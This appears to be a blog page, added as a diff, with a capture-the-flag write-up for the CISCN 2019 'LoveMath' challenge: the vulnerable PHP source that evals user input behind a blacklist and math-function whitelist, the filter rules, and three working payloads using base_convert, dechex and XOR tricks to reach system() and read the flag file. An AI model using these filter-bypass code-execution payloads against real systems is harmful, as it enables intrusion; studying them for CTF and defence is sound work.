@@ -1,0 +1,204 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CISCN:2019-LoveMath - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="&amp;lt;?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET[&#39;c&#39;])){
+    show_source(__F,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">CISCN:2019-LoveMath</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">CISCN:2019-LoveMath</h1>
+        <div class="stuff">
+            <span>七月 06, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//例子 c=20-1</span>
+    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
+    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token comment" spellcheck="true">//帮你算出答案</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> </code></pre>
+<ol>
+<li>payload长度不能超过80</li>
+<li>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 这些字符</li>
+<li>payload中不能有不是$whitelist白名单里面的单词出现</li>
+</ol>
+<pre><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac /flag</code></pre>
+<pre><code>?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))(){1})//exec(getallheaders(){1})</code></pre>
+<pre><code>http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+				
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
